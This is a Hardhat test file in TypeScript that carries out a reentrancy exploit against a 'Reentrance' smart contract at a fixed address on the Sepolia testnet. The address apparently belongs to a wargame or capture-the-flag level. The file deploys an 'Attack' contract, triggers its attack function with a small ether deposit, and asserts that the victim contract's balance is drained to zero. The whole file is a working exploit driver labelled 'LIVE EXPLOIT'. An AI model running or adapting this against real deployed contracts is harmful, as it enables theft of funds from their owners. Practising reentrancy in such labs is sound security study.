import { time, loadFixture } from "@nomicfoundation/hardhat-network-helpers";
import { anyValue } from "@nomicfoundation/hardhat-chai-matchers/withArgs";
import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract } from "ethers";
import { Attack, Reentrance } from "../typechain-types";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { getContractAddress } from "ethers/lib/utils";

describe("Reentrancy Exploit using EOA", function () {
  let attackerContract: Attack,
    reentrantContract: Reentrance,
    // attacker: SignerWithAddress,
    contractAddress: string,
    finalBalance: BigNumber;

  before("Setup for attack on sepolia [LIVE EXPLOIT]", async function () {
    // [attacker] = await ethers.getSigners();
    contractAddress = "0xBFDc8384cf46C34f5aA1eE5532cED0E924837963"; //instance address of contract to attack

    // grab the contract located on sepolia
    reentrantContract = await ethers.getContractAt(
      "Reentrance",
      contractAddress
    );

    // deploy attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);
    await attackerContract.deployed();
  });

  it("perform exploit", async function () {
    // // Attack flow

    // 1 Initiate the attack by calling our attack contract attack function

    let txAttack = await attackerContract.attack({
      value: ethers.utils.parseEther(".0001"),
    });

    let attackReceipt = await txAttack.wait();

    console.log("The attack receipt is: ", attackReceipt);

    finalBalance = await ethers.provider.getBalance(reentrantContract.address);
  }).timeout(3000000);

  after("confirm exploit", async function () {
    // check that the reentrance contract == 0

    expect(finalBalance.toString()).to.be.eq("0");
  });
});
